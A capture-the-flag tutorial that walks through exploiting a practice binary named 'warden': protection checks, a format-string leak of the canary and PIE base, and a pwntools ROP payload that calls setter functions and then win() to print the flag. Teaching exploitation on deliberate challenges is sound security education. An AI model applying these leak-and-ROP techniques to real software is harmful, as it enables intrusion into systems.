# PWN Challenge Tutorial: How to Solve "warden"

This tutorial teaches you the systematic approach to solve binary exploitation challenges.

## Phase 1: Reconnaissance & Information Gathering

### Step 1.1: Check file type and architecture
```bash
file warden
# Output: ELF 32-bit LSB pie executable, Intel 80386
```
**What you learn**: 32-bit binary, Position Independent (PIE enabled)

### Step 1.2: Check security protections
```bash
checksec warden
```
**What you learn**:
- Stack Canary: You'll need to leak/bypass it
- NX: No shellcode on stack, need ROP or ret2libc
- PIE: Addresses randomized, need information leak
- RELRO: GOT overwrite difficult

### Step 1.3: Run the binary to understand behavior
```bash
./warden
```
**Observe**:
- What input does it ask for?
- What output does it produce?
- Does it crash with long input?

### Step 1.4: Examine strings and functions
```bash
strings warden | less
nm warden | grep " T "        # List functions
objdump -d warden | less      # Disassemble
```
**Look for**:
- Interesting function names (win, flag, admin, etc.)
- Suspicious strings ("flag.txt", "/bin/sh")
- Helper functions that might be useful

## Phase 2: Vulnerability Identification

### Step 2.1: Analyze main flow
```bash
objdump -d warden | grep -A 50 "<main>"
```
**Questions to ask**:
- What functions does main call?
- Are there buffer reads (gets, scanf, read)?
- Are there format strings (printf, fprintf)?

### Step 2.2: Find vulnerabilities
Common vulnerabilities to look for:

**Buffer Overflow**:
```c
char buffer[32];
gets(buffer);  // VULNERABLE: No bounds checking
```

**Format String**:
```c
char buffer[100];
gets(buffer);
printf(buffer);  // VULNERABLE: User controls format string
```

**Use-after-free, Integer overflow, etc.**

### Step 2.3: Analyze vulnerable functions
```bash
objdump -d warden | grep -A 100 "<vulnerable_function>"
```

For this challenge (tft function):
```
- First gets() -> printf() (format string!)
- Second gets() (buffer overflow!)
```

## Phase 3: Exploit Strategy Development

### Step 3.1: Determine what you need

For this challenge, analyze the `win()` function:
```bash
objdump -d warden | grep -A 100 "<win>"
```

**Observations**:
```
- Checks: jinx == 0x1337
- Checks: mf == 0x420  
- Checks: trex == 0xdeadbeef
- Checks: argument == 0x123
- If pass: opens flag.txt and prints it
```

**Requirements**:
1. Bypass canary (leak it)
2. Defeat PIE (leak code address)
3. Set 3 global variables
4. Call win(0x123)

### Step 3.2: Plan the attack chain

```
1. Use format string to leak addresses
   - Leak code pointer -> calculate PIE base
   - Leak canary -> bypass stack protection

2. Set global variables
   - Option A: Format string writes (complicated, buffer limited)
   - Option B: Find setter functions (braum, ornn, thress)
   - Option C: ROP to manually write (complex)

3. Buffer overflow to control execution
   - Overflow buffer
   - Overwrite return address
   - Jump to win()
```

## Phase 4: Information Leak (Format String)

### Step 4.1: Understanding format string positions

The buffer is on the stack. When you do `printf(buffer)`, the format string specifiers read from the stack:

```
Stack layout:
[return address]
[saved ebp]
[saved ebx]
[canary]
[buffer]
...
[other stack data]
[pointers to code/data]
```

### Step 4.2: Finding positions

Test with:
```python
p.sendline(b'AAAA%p.%p.%p.%p.%p')
```

Count positions:
- %1$p = first argument
- %2$p = second argument
- etc.

### Step 4.3: Leak specific values

```python
# Position 3: Code pointer (look for values starting with 0x565xxxxx)
# Position 15: Canary (look for values ending in 00)

payload = b'%3$08x|%15$08x'
# Gives you two hex values separated by |
```

### Step 4.4: Calculate base address

```python
code_leak = int(leaked_value, 16)
base = code_leak - offset_from_base
# Now you can calculate ANY address: base + offset
```

## Phase 5: Finding Useful Gadgets/Functions

### Step 5.1: Look for helper functions

```bash
nm warden | grep " T "
```

Found: `braum`, `ornn`, `thress` - suspicious names!

### Step 5.2: Analyze helper functions

```bash
objdump -d warden | grep -A 20 "<braum>"
```

```asm
mov 0x8(%ebp),%edx  ; Get argument from stack
mov %edx,0x5c(%eax) ; Write to global variable
```

**Discovery**: These functions SET the global variables we need!

### Step 5.3: Find ROP gadgets

```bash
ROPgadget --binary warden | grep "pop.*ret"
```

Need: `pop <reg>; ret` to clean up function arguments in ROP chain

## Phase 6: Building the Exploit

### Step 6.1: Understanding i386 calling convention

```
Function call:
[return_address]
[argument_1]
[argument_2]
...
```

When function returns: `pop return_address; jmp there`

### Step 6.2: ROP Chain structure

To call `function(arg)` then continue:
```
[function_address]
[cleanup_gadget]  ; pop <reg>; ret
[argument]
[next_function]
```

### Step 6.3: Complete payload structure

```python
payload = b'A' * 32          # Fill buffer
payload += p32(canary)        # Correct canary (leaked)
payload += p32(0)             # Saved EBX
payload += p32(0)             # Saved EBP

# ROP chain
payload += p32(braum)         # Call braum
payload += p32(pop_ret)       # Return here, pop arg
payload += p32(0x1337)        # Argument

payload += p32(ornn)          # Call ornn
payload += p32(pop_ret)
payload += p32(0x420)

payload += p32(thress)        # Call thress
payload += p32(pop_ret)
payload += p32(0xdeadbeef)

payload += p32(win)           # Call win
payload += p32(0)             # Fake return
payload += p32(0x123)         # Argument
```

## Phase 7: Testing and Debugging

### Step 7.1: Test locally first

```python
context.log_level = 'debug'  # See all communication
p = process('./warden')
```

### Step 7.2: Common issues and solutions

**Issue**: "Segmentation fault"
- Check canary is correct
- Verify addresses are calculated correctly
- Check buffer size

**Issue**: "Stack smashing detected"
- Canary check failed
- You overwrote the wrong canary
- Stack misaligned

**Issue**: No output
- Function didn't execute
- ROP chain broken
- Wrong gadgets

### Step 7.3: Debugging with GDB

```bash
gdb ./warden
break *vulnerable_function
run
# Send payload
x/40wx $esp  # Examine stack
info registers
continue
```

## Phase 8: Key Learning Points

### 8.1: Always follow this methodology

1. **Reconnaissance**: Understand the target
2. **Vulnerability Discovery**: Find the bugs
3. **Strategy**: Plan before coding
4. **Implementation**: Write exploit step by step
5. **Testing**: Debug locally first
6. **Adaptation**: Adjust for remote environment

### 8.2: Tools mastery

- `checksec`: Security analysis
- `objdump`: Disassembly
- `nm`: Symbol listing
- `strings`: String extraction
- `ROPgadget`: Finding ROP gadgets
- `gdb/pwndbg`: Debugging
- `pwntools`: Exploit development

### 8.3: Common patterns

**Pattern 1**: Info leak + ROP
```
1. Leak addresses (format string, arbitrary read)
2. Build ROP chain
3. Execute
```

**Pattern 2**: Ret2libc
```
1. Leak libc address
2. Calculate system() address
3. Call system("/bin/sh")
```

**Pattern 3**: Heap exploitation
```
1. Trigger use-after-free
2. Manipulate heap layout
3. Overwrite function pointers
```

## Practice Exercises

1. **Modify the exploit** to use different gadgets
2. **Add features** like automatic offset finding
3. **Try locally** without the source code
4. **Solve similar challenges** on CTF platforms:
   - pwnable.kr
   - pwnable.tw
   - HackTheBox

## Additional Resources

- **Books**: 
  - "Hacking: The Art of Exploitation"
  - "The Shellcoder's Handbook"
  
- **Courses**:
  - Pwn College (pwn.college)
  - ROP Emporium (ropemporium.com)
  
- **Practice**:
  - PicoCTF
  - CTFtime.org

## Final Tips

1. **Read the code/assembly**: Understanding > guessing
2. **Test incrementally**: Add one piece at a time
3. **Document your findings**: Write down offsets, addresses
4. **Learn from failures**: Every crash teaches something
5. **Practice regularly**: PWN requires hands-on experience

---

Good luck with your binary exploitation journey! 🚀
